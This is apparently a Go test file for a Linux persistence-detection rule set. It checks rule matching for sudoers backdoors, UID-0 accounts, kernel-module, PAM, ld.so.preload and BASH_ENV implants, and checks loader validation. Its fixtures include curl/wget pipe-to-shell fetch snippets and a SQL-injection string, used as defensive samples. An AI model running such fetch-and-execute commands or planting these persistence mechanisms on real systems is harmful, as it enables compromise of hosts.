package detections

import (
	"strings"
	"testing"

	"github.com/jarmidaw/linpersist/internal/core"
)

// loadRepoYAML returns the parsed embedded rule set. Tests run
// against the same bytes the report binary embeds at build time,
// so a regression here either means the YAML is malformed or the
// loader rejected something the binary will also reject. No
// filesystem walk needed; `go test` works from any cwd.
func loadRepoYAML(t *testing.T) *RuleSet {
	t.Helper()
	rs, err := LoadEmbedded()
	if err != nil {
		t.Fatalf("load embedded: %v", err)
	}
	return rs
}

// TestRepoYAMLLoads verifies that the committed detections.yaml
// parses and validates against the live signals catalog. Acts as
// the canary against drift between the YAML and core/signals.go.
func TestRepoYAMLLoads(t *testing.T) {
	rs := loadRepoYAML(t)
	if rs.SchemaVersion != SchemaVersion {
		t.Fatalf("schema_version = %d, want %d", rs.SchemaVersion, SchemaVersion)
	}
	if len(rs.Detections) == 0 {
		t.Fatal("rule set is empty")
	}
	// Sanity: every detection id should be unique (loader checks
	// this but a regression here is so cheap to catch we keep the
	// assertion explicit).
	seen := map[string]struct{}{}
	for _, d := range rs.Detections {
		if _, dup := seen[d.ID]; dup {
			t.Errorf("duplicate detection id %q", d.ID)
		}
		seen[d.ID] = struct{}{}
	}
}

// TestRepoYAMLMatchesQ7Goldens runs Match against synthetic records
// chosen to exercise every clause currently in detections.yaml. The
// expected detection set is hand-written from the YAML; a mismatch
// means either the YAML changed or the matcher's semantics drifted.
func TestRepoYAMLMatchesQ7Goldens(t *testing.T) {
	rs := loadRepoYAML(t)
	cases := []struct {
		name string
		rec  core.Record
		want []string
	}{
		{
			name: "orphan+tmp implant",
			rec: core.Record{
				Module:  "systemd",
				Signals: []string{core.SignalExecTargetOrphan, core.SignalInterpreterInTmp},
			},
			want: []string{"payload_under_tmp_via_persistence"},
		},
		{
			name: "sudoers nopasswd ALL backdoor",
			rec: core.Record{
				Module:  "sudoers",
				Signals: []string{core.SignalSudoersNoPasswd, core.SignalSudoersAllCommands},
			},
			want: []string{"sudoers_nopasswd_all_backdoor"},
		},
		{
			name: "uid 0 non-root account",
			rec: core.Record{
				Module:  "passwd",
				Signals: []string{core.SignalPasswdUIDZero},
			},
			want: []string{"second_uid_zero_account"},
		},
		{
			name: "kmod install directive pointing at orphan binary",
			rec: core.Record{
				Module: "kmod",
				Signals: []string{
					core.SignalKmodInstallDirective,
					core.SignalExecTargetOrphan,
				},
			},
			want: []string{"kmod_install_directive_implant"},
		},
		{
			name: "kmod install directive pointing at non-package binary",
			rec: core.Record{
				Module: "kmod",
				Signals: []string{
					core.SignalKmodInstallDirective,
					core.SignalNonPackagePath,
				},
			},
			want: []string{"kmod_install_directive_implant"},
		},
		{
			name: "kmod install directive alone (package-managed) -- v0.2.x-tune suppression",
			rec: core.Record{
				Module:  "kmod",
				Signals: []string{core.SignalKmodInstallDirective},
			},
			want: nil,
		},
		{
			name: "profile curl remote fetch",
			rec: core.Record{
				Module:         "profile",
				ContentSnippet: "wget -qO- http://x/y | sh",
			},
			want: []string{"shell_init_remote_fetch"},
		},
		{
			name: "profile curl remote fetch (curl variant)",
			rec: core.Record{
				Module:         "profile",
				ContentSnippet: "curl https://x/y | bash",
			},
			want: []string{"shell_init_remote_fetch"},
		},
		{
			name: "sysv referencing /tmp/",
			rec: core.Record{
				Module:         "sysv",
				ContentSnippet: "/tmp/.x/payload --daemon",
			},
			want: []string{"sysv_init_tmp_reference"},
		},
		{
			name: "motd remote fetch",
			rec: core.Record{
				Module:         "motd",
				ContentSnippet: "curl -s http://x/y | sh",
			},
			want: []string{"motd_remote_fetch"},
		},
		{
			name: "two clauses fire on one record",
			rec: core.Record{
				Module: "sudoers",
				Signals: []string{
					core.SignalSudoersNoPasswd, core.SignalSudoersAllCommands,
					core.SignalExecTargetOrphan, core.SignalInterpreterInTmp,
				},
			},
			want: []string{"payload_under_tmp_via_persistence", "sudoers_nopasswd_all_backdoor"},
		},
		{
			name: "benign sudoers root ALL=(ALL) ALL — must NOT match",
			rec: core.Record{
				Module:  "sudoers",
				Signals: []string{core.SignalSudoersAllCommands},
			},
			want: nil,
		},
		{
			name: "benign profile file with no curl/wget — must NOT match",
			rec: core.Record{
				Module:         "profile",
				ContentSnippet: "export PS1='[\\u@\\h]\\$ '",
			},
			want: nil,
		},
		{
			name: "benign systemd unit (orphan but not in tmp) — must NOT match",
			rec: core.Record{
				Module:  "systemd",
				Signals: []string{core.SignalExecTargetOrphan},
			},
			want: nil,
		},
		// --- v0.2.x-tune: refined patterns drop these FPs ---------
		{
			name: "v0.2.x-tune FP: profile mentions 'curl' without piping to shell",
			rec: core.Record{
				Module:         "profile",
				ContentSnippet: "alias get='curl -fSL'  # convenience alias",
			},
			want: nil,
		},
		{
			name: "v0.2.x-tune FP: rustup-style dotfile installer (curl ... -o)",
			rec: core.Record{
				Module:         "profile",
				ContentSnippet: "# Run: curl https://sh.rustup.rs -o rustup-init.sh",
			},
			want: nil,
		},
		{
			name: "v0.2.x-tune FP: sysv legacy init using /tmp/svc.lock",
			rec: core.Record{
				Module:         "sysv",
				ContentSnippet: "PIDFILE=/tmp/svc.lock; daemon /usr/sbin/svc",
			},
			want: nil,
		},
		{
			name: "v0.2.x-tune FP: motd plain text mentions a tutorial URL",
			rec: core.Record{
				Module:         "motd",
				ContentSnippet: "See docs: curl -s https://intranet/docs > out.txt",
			},
			want: nil,
		},
		// --- v0.2.x-tune: new detections for previously-unused signals
		{
			name: "PAM module loaded from /tmp",
			rec: core.Record{
				Module:  "pam",
				Signals: []string{core.SignalInterpreterInTmp},
			},
			want: []string{"pam_module_in_tmp"},
		},
		{
			name: "systemd external wants symlink",
			rec: core.Record{
				Module:  "systemd",
				Signals: []string{core.SignalSystemdExternalUnitSymlink},
			},
			want: []string{"systemd_external_unit_symlink_implant"},
		},
		{
			name: "GRUB cmdline init override",
			rec: core.Record{
				Module:  "grub",
				Signals: []string{core.SignalGrubCmdlineInit},
			},
			want: []string{"grub_init_override"},
		},
		// v0.4.0 — T1548.001 suidbits implant rule.
		{
			name: "suid bit + non-package path -> T1548.001 implant",
			rec: core.Record{
				Module: "suidbits",
				Signals: []string{
					core.SignalSuidBitSet,
					core.SignalNonPackagePath,
				},
			},
			want: []string{"suid_binary_outside_package_path"},
		},
		{
			name: "sgid bit + non-package path -> same T1548.001 rule",
			rec: core.Record{
				Module: "suidbits",
				Signals: []string{
					core.SignalSgidBitSet,
					core.SignalNonPackagePath,
				},
			},
			want: []string{"suid_binary_outside_package_path"},
		},
		{
			name: "suid bit on package-managed path -> rule suppressed",
			rec: core.Record{
				Module:  "suidbits",
				Signals: []string{core.SignalSuidBitSet},
			},
			want: nil,
		},

		// v0.5.0 follow-up: cloud-native rules.

		{
			name: "dbus.system Exec= under /tmp orphan -> dbus_exec_under_tmp + payload_under_tmp_via_persistence",
			rec: core.Record{
				Module: "dbus",
				Signals: []string{
					core.SignalInterpreterInTmp,
					core.SignalExecTargetOrphan,
				},
			},
			want: []string{"payload_under_tmp_via_persistence", "dbus_exec_under_tmp"},
		},
		{
			name: "dbus Exec= under /tmp armed (payload exists, no orphan) -> dbus_exec_under_tmp only",
			rec: core.Record{
				Module:  "dbus",
				Signals: []string{core.SignalInterpreterInTmp},
			},
			want: []string{"dbus_exec_under_tmp"},
		},
		{
			name: "non-dbus module with interpreter_in_tmp alone -> dbus rule must NOT fire",
			rec: core.Record{
				Module:  "cron",
				Signals: []string{core.SignalInterpreterInTmp},
			},
			want: nil,
		},
		{
			name: "cloudinit.script record with non_package_path -> cloudinit_script_non_package_path",
			rec: core.Record{
				Module:    "cloudinit",
				SiteClass: "cloudinit.script",
				Signals:   []string{core.SignalNonPackagePath, core.SignalRecentMtime7d},
			},
			want: []string{"cloudinit_script_non_package_path"},
		},
		{
			name: "cloudinit.config record with non_package_path -> rule suppressed by site_class_in",
			rec: core.Record{
				Module:    "cloudinit",
				SiteClass: "cloudinit.config",
				Signals:   []string{core.SignalNonPackagePath, core.SignalRecentMtime7d},
			},
			want: nil,
		},
		{
			name: "cloudinit.script record without non_package_path -> rule suppressed",
			rec: core.Record{
				Module:    "cloudinit",
				SiteClass: "cloudinit.script",
				Signals:   []string{core.SignalRecentMtime7d},
			},
			want: nil,
		},
		{
			name: "k8sstatic pod with unqualified image -> k8s_static_pod_unqualified_image",
			rec: core.Record{
				Module:  "k8sstatic",
				Signals: []string{core.SignalUnqualifiedExecTarget},
			},
			want: []string{"k8s_static_pod_unqualified_image"},
		},
		{
			name: "k8sstatic pod with full registry ref (no unqualified signal) -> rule suppressed",
			rec: core.Record{
				Module:  "k8sstatic",
				Signals: []string{core.SignalRecentMtime7d, core.SignalNonRootOwner},
			},
			want: nil,
		},
		{
			name: "unqualified_exec_target on non-k8sstatic module -> k8s rule must NOT fire",
			rec: core.Record{
				Module:  "cron",
				Signals: []string{core.SignalUnqualifiedExecTarget},
			},
			want: nil,
		},
		{
			name: "package file tampered (append, fresh mtime) -> tamper rule only, NOT timestomp",
			rec: core.Record{
				Module: "cron",
				Signals: []string{
					core.SignalPackageFileTampered,
					core.SignalRecentCtime7d,
					core.SignalRecentMtime7d,
				},
			},
			want: []string{"package_owned_file_tampered"},
		},
		{
			name: "package file tampered AND mtime back-dated -> timestomp (high-precision) + tamper",
			rec: core.Record{
				Module: "cron",
				Signals: []string{
					core.SignalPackageFileTampered,
					core.SignalRecentCtime7d,
				},
			},
			want: []string{"timestomp_recent_ctime_stale_mtime", "package_owned_file_tampered"},
		},
		{
			name: "pristine image-extracted package file (fresh ctime, old mtime, NO tamper) -> nothing",
			rec: core.Record{
				Module:  "udev",
				Signals: []string{core.SignalRecentCtime7d},
			},
			want: nil,
		},
		{
			name: "sshd PermitUserEnvironment yes -> login env injection rule",
			rec: core.Record{
				Module:  "sshd",
				Signals: []string{core.SignalSSHDPermitUserEnvironment},
			},
			want: []string{"sshd_login_env_injection"},
		},
		{
			name: "autoloaded kernel module resolves to an unpackaged .ko -> rootkit rule",
			rec: core.Record{
				Module:  "kmod",
				Signals: []string{core.SignalKmodAutoload, core.SignalNonPackagePath},
			},
			want: []string{"kmod_autoload_unpackaged_module"},
		},
		{
			name: "systemd drop-in ExecStartPre to an unmanaged target -> systemd_aux_exec_unmanaged",
			rec: core.Record{
				Module:  "systemd",
				Signals: []string{core.SignalSystemdAuxExecUnmanaged},
			},
			want: []string{"systemd_aux_exec_unmanaged"},
		},
		{
			name: "cron packaged interpreter runs an orphan script -> interpreter_executes_unmanaged_script",
			rec: core.Record{
				Module:  "cron",
				Signals: []string{core.SignalInterpreterRunsOrphanScript},
			},
			want: []string{"interpreter_executes_unmanaged_script"},
		},
		{
			name: "NOPASSWD on a GTFOBin shell-escape -> sudoers_nopasswd_shell_escape",
			rec: core.Record{
				Module:  "sudoers",
				Signals: []string{core.SignalSudoersNoPasswd, core.SignalSudoersNopasswdGtfobin},
			},
			want: []string{"sudoers_nopasswd_shell_escape"},
		},
		{
			name: "ld.so.preload target is an in-place-tampered owned .so -> critical (Symbiote shape)",
			rec: core.Record{
				Module:  "ldso",
				Signals: []string{core.SignalLDPreloadSet, core.SignalPackageFileTampered},
			},
			want: []string{"ld_preload_target_tampered", "package_owned_file_tampered"},
		},
		{
			name: "ld.so.conf.d search-path shadows a packaged library -> ld_library_shadow_implant",
			rec: core.Record{
				Module:  "ldso",
				Signals: []string{core.SignalLDLibraryShadowsPackaged, core.SignalNonPackagePath},
			},
			want: []string{"ld_library_shadow_implant"},
		},
		{
			name: "ld.so.conf.d non-standard dir with no collision (bare path-injection) -> LFA-only, no Q7",
			rec: core.Record{
				Module:  "ldso",
				Signals: []string{core.SignalNonRootOwner},
			},
			want: nil,
		},
		{
			name: "netdispatch script outside the package universe -> dispatcher rule fires",
			rec: core.Record{
				Module:  "netdispatch",
				Signals: []string{core.SignalNonPackagePath},
			},
			want: []string{"netdispatch_run_unmanaged"},
		},
		{
			name: "polkit YES rule timestomped (fresh ctime, mtime back-dated) -> NOT a Q7 hit (recent_ctime deliberately not gated; LFA catches it)",
			rec: core.Record{
				Module:  "polkit",
				Signals: []string{core.SignalPolkitYesConstant, core.SignalRecentCtime7d},
			},
			want: nil,
		},
		{
			name: "polkit YES rule recently modified by mtime -> flagged (legit freshness gate)",
			rec: core.Record{
				Module:  "polkit",
				Signals: []string{core.SignalPolkitYesConstant, core.SignalRecentMtime7d},
			},
			want: []string{"polkit_yes_constant_implant"},
		},
		// BASH_ENV/ENV per-shell source hook (duel-2 backlog #1).
		{
			name: "BASH_ENV hook points at an orphan target -> profile_env_hook_unmanaged",
			rec: core.Record{
				Module:  "profile",
				Signals: []string{core.SignalEnvHookSet, core.SignalExecTargetOrphan},
			},
			want: []string{"profile_env_hook_unmanaged"},
		},
		{
			name: "BASH_ENV hook points at a non-package target -> profile_env_hook_unmanaged",
			rec: core.Record{
				Module:  "profile",
				Signals: []string{core.SignalEnvHookSet, core.SignalNonPackagePath},
			},
			want: []string{"profile_env_hook_unmanaged"},
		},
		{
			name: "BASH_ENV hook under /tmp, orphan -> payload_under_tmp + profile_env_hook_unmanaged",
			rec: core.Record{
				Module:  "profile",
				Signals: []string{core.SignalEnvHookSet, core.SignalInterpreterInTmp, core.SignalExecTargetOrphan},
			},
			want: []string{"payload_under_tmp_via_persistence", "profile_env_hook_unmanaged"},
		},
		{
			name: "BASH_ENV hook at a package-owned target (armed, no co-indicator) -> suppressed",
			rec: core.Record{
				Module:  "profile",
				Signals: []string{core.SignalEnvHookSet},
			},
			want: nil,
		},
		{
			name: "profile record with non_package_path but no env_hook_set -> env-hook rule must NOT fire",
			rec: core.Record{
				Module:  "profile",
				Signals: []string{core.SignalNonPackagePath},
			},
			want: nil,
		},
		// initramfs early-boot hook (duel-2 backlog #2).
		{
			name: "non-package initramfs hook -> initramfs_hook_unmanaged",
			rec: core.Record{
				Module:  "initramfs",
				Signals: []string{core.SignalNonPackagePath},
			},
			want: []string{"initramfs_hook_unmanaged"},
		},
		{
			name: "in-place tampered package-owned initramfs hook -> initramfs_hook_unmanaged + package_owned_file_tampered",
			rec: core.Record{
				Module:  "initramfs",
				Signals: []string{core.SignalPackageFileTampered},
			},
			want: []string{"initramfs_hook_unmanaged", "package_owned_file_tampered"},
		},
		{
			name: "package-owned pristine initramfs hook (no co-indicator) -> suppressed",
			rec: core.Record{
				Module:  "initramfs",
				Signals: []string{core.SignalRecentMtime30d},
			},
			want: nil,
		},
		{
			name: "non_package_path on a non-initramfs module (no other co-indicator) -> initramfs rule must NOT fire",
			rec: core.Record{
				Module:  "cron",
				Signals: []string{core.SignalNonPackagePath},
			},
			want: nil,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := rs.Match(tc.rec)
			if !equalStrSlice(got, tc.want) {
				t.Errorf("Match: got %v, want %v", got, tc.want)
			}
		})
	}
}

// TestRepoYAMLSQLDeterministic verifies that RenderSQL is stable
// across calls (no map iteration order leaking out).
func TestRepoYAMLSQLDeterministic(t *testing.T) {
	rs := loadRepoYAML(t)
	a := rs.RenderSQL(DefaultSQLOptions)
	for i := 0; i < 8; i++ {
		b := rs.RenderSQL(DefaultSQLOptions)
		if a != b {
			t.Fatalf("RenderSQL is non-deterministic; iteration %d differs", i)
		}
	}
}

// TestLoaderRejectsBadInputs covers every failure path the loader is
// supposed to catch. Each case lists the YAML and the substring the
// error message must contain.
func TestLoaderRejectsBadInputs(t *testing.T) {
	cases := []struct {
		name string
		yaml string
		want string // substring of the expected error
	}{
		{
			name: "wrong schema version",
			yaml: "schema_version: 99\ndetections: [{id: x, when: {signals_any: [exec_target_orphan]}}]\n",
			want: "schema_version",
		},
		{
			name: "empty rule set",
			yaml: "schema_version: 1\ndetections: []\n",
			want: "empty",
		},
		{
			name: "missing id",
			yaml: "schema_version: 1\ndetections: [{when: {signals_any: [exec_target_orphan]}}]\n",
			want: "missing id",
		},
		{
			name: "non-snake-case id",
			yaml: "schema_version: 1\ndetections: [{id: Bad-Id, when: {signals_any: [exec_target_orphan]}}]\n",
			want: "snake_case",
		},
		{
			name: "duplicate id",
			yaml: "schema_version: 1\ndetections:\n  - {id: x, when: {signals_any: [exec_target_orphan]}}\n  - {id: x, when: {signals_any: [interpreter_in_tmp]}}\n",
			want: "duplicate id",
		},
		{
			name: "empty when",
			yaml: "schema_version: 1\ndetections: [{id: x, when: {}}]\n",
			want: "no predicates",
		},
		{
			name: "unknown signal",
			yaml: "schema_version: 1\ndetections: [{id: x, when: {signals_any: [definitely_not_a_signal]}}]\n",
			want: "unknown signal",
		},
		{
			name: "bad mitre id",
			yaml: "schema_version: 1\ndetections: [{id: x, mitre: [T123, T1234.99], when: {signals_any: [exec_target_orphan]}}]\n",
			want: "mitre id",
		},
		{
			name: "bad severity",
			yaml: "schema_version: 1\ndetections: [{id: x, severity: scary, when: {signals_any: [exec_target_orphan]}}]\n",
			want: "severity",
		},
		{
			name: "sql-unsafe content substring",
			yaml: "schema_version: 1\ndetections: [{id: x, when: {module_in: [cron], content_contains_any: [\"O'Reilly\"]}}]\n",
			want: "SQL-unsafe",
		},
		{
			name: "sql-unsafe module_in (quote breaks equality literal)",
			yaml: "schema_version: 1\ndetections: [{id: x, when: {module_in: [\"cron' OR '1'='1\"]}}]\n",
			want: "module_in",
		},
		{
			name: "sql-unsafe site_class_in (backslash)",
			yaml: "schema_version: 1\ndetections: [{id: x, when: {site_class_in: [\"cron.d\\\\\"]}}]\n",
			want: "site_class_in",
		},
		{
			name: "empty module_in entry",
			yaml: "schema_version: 1\ndetections: [{id: x, when: {module_in: [\"\"]}}]\n",
			want: "module_in has empty entry",
		},
		{
			name: "empty site_class_in entry",
			yaml: "schema_version: 1\ndetections: [{id: x, when: {site_class_in: [\"\"]}}]\n",
			want: "site_class_in has empty entry",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := Load([]byte(tc.yaml), nil, nil)
			if err == nil {
				t.Fatal("expected error, got nil")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("error %q does not contain %q", err.Error(), tc.want)
			}
		})
	}
}

// TestModuleInClosedSetCheck exercises the (previously dead) modules
// argument: when a registry is supplied, module_in must reference a
// known module. A dotted site_class and a real module name must NOT be
// rejected by the SQL-safety guards — guarding against a false positive
// that would fail the build gate on legitimate rules.
func TestModuleInClosedSetCheck(t *testing.T) {
	known := map[string]struct{}{"cron": {}, "ssh": {}}

	bad := "schema_version: 1\ndetections: [{id: x, when: {module_in: [definitely_not_a_module]}}]\n"
	if _, err := Load([]byte(bad), nil, known); err == nil || !strings.Contains(err.Error(), "unknown module") {
		t.Fatalf("expected unknown-module error, got %v", err)
	}

	good := "schema_version: 1\ndetections: [{id: x, when: {module_in: [cron], site_class_in: [cron.d]}}]\n"
	if _, err := Load([]byte(good), nil, known); err != nil {
		t.Fatalf("clean rule with dotted site_class rejected: %v", err)
	}
}

// TestTrapHandlerInTmpDetection guards the trap_handler_payload_in_tmp
// rule added after the nspawn lab showed a real coverage gap: a shell
// trap EXIT handler pointing at a /tmp payload was collected with the
// right signals (trap_command_in_tmp) but matched no Q7 detection.
func TestTrapHandlerInTmpDetection(t *testing.T) {
	rs := loadRepoYAML(t)

	hit := core.Record{
		Module:    "profile",
		SiteClass: "profile.trap.system",
		Signals:   []string{"trap_command", "trap_exit_handler", "trap_command_in_tmp", "recent_mtime_7d"},
	}
	if !contains(rs.Match(hit), "trap_handler_payload_in_tmp") {
		t.Fatalf("trap-in-tmp record did not match trap_handler_payload_in_tmp; got %v", rs.Match(hit))
	}

	// A trap NOT under tmp must not fire the rule (no trap_command_in_tmp).
	miss := core.Record{
		Module:    "profile",
		SiteClass: "profile.trap.system",
		Signals:   []string{"trap_command", "trap_exit_handler", "recent_mtime_7d"},
	}
	if contains(rs.Match(miss), "trap_handler_payload_in_tmp") {
		t.Fatalf("rule fired without trap_command_in_tmp; got %v", rs.Match(miss))
	}
}

func contains(ids []string, want string) bool {
	for _, id := range ids {
		if id == want {
			return true
		}
	}
	return false
}

func equalStrSlice(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// --- signals_none predicate (schema v1 additive extension) -----------

// TestSignalsNoneMatcher exercises the negative predicate.
func TestSignalsNoneMatcher(t *testing.T) {
	yamlText := `schema_version: 1
detections:
  - id: kmod_install_unmanaged
    when:
      signals_all: [kmod_install_directive]
      signals_none: [live_process_attached]
  - id: orphan_tmp_excluding_world_writable
    when:
      signals_all: [exec_target_orphan, interpreter_in_tmp]
      signals_none: [world_writable]
`
	rs, err := Load([]byte(yamlText), nil, nil)
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	cases := []struct {
		name string
		rec  core.Record
		want []string
	}{
		{
			name: "kmod install without negative signal -> matches",
			rec:  core.Record{Signals: []string{core.SignalKmodInstallDirective}},
			want: []string{"kmod_install_unmanaged"},
		},
		{
			name: "kmod install with negative signal -> suppressed",
			rec: core.Record{Signals: []string{
				core.SignalKmodInstallDirective,
				core.SignalLiveProcessAttached,
			}},
			want: nil,
		},
		{
			name: "orphan+tmp with world_writable -> suppressed",
			rec: core.Record{Signals: []string{
				core.SignalExecTargetOrphan,
				core.SignalInterpreterInTmp,
				core.SignalWorldWritable,
			}},
			want: nil,
		},
		{
			name: "orphan+tmp without world_writable -> matches",
			rec: core.Record{Signals: []string{
				core.SignalExecTargetOrphan,
				core.SignalInterpreterInTmp,
			}},
			want: []string{"orphan_tmp_excluding_world_writable"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := rs.Match(tc.rec)
			if !equalStrSlice(got, tc.want) {
				t.Errorf("Match: got %v, want %v", got, tc.want)
			}
		})
	}
}

// TestSignalsNoneSQL verifies the SQL generator emits the negative clauses.
func TestSignalsNoneSQL(t *testing.T) {
	yamlText := `schema_version: 1
detections:
  - id: r
    when:
      signals_all: [exec_target_orphan]
      signals_none: [world_writable, live_process_attached]
`
	rs, err := Load([]byte(yamlText), nil, nil)
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	got := rs.RenderSQL(DefaultSQLOptions)
	want := "/* r */ (NOT list_contains(signals, 'world_writable') AND NOT list_contains(signals, 'live_process_attached') AND list_contains(signals, 'exec_target_orphan'))"
	if got != want {
		t.Errorf("RenderSQL:\n got:  %s\nwant: %s", got, want)
	}
}

// TestSignalsNoneLoaderRejects covers loader-side validation.
func TestSignalsNoneLoaderRejects(t *testing.T) {
	cases := []struct {
		name string
		yaml string
		want string
	}{
		{
			name: "unknown signal in signals_none",
			yaml: "schema_version: 1\ndetections: [{id: x, when: {signals_all: [exec_target_orphan], signals_none: [definitely_not_a_signal]}}]\n",
			want: "signals_none references unknown signal",
		},
		{
			name: "signals_none only -- no positive predicate",
			yaml: "schema_version: 1\ndetections: [{id: x, when: {signals_none: [exec_target_orphan]}}]\n",
			want: "no predicates",
		},
		{
			name: "same signal in both signals_all and signals_none",
			yaml: "schema_version: 1\ndetections: [{id: x, when: {signals_all: [exec_target_orphan], signals_none: [exec_target_orphan]}}]\n",
			want: "can never fire",
		},
		{
			name: "same signal in both signals_any and signals_none",
			yaml: "schema_version: 1\ndetections: [{id: x, when: {signals_any: [exec_target_orphan, interpreter_in_tmp], signals_none: [exec_target_orphan]}}]\n",
			want: "can never fire",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := Load([]byte(tc.yaml), nil, nil)
			if err == nil {
				t.Fatal("expected error, got nil")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("error %q does not contain %q", err.Error(), tc.want)
			}
		})
	}
}
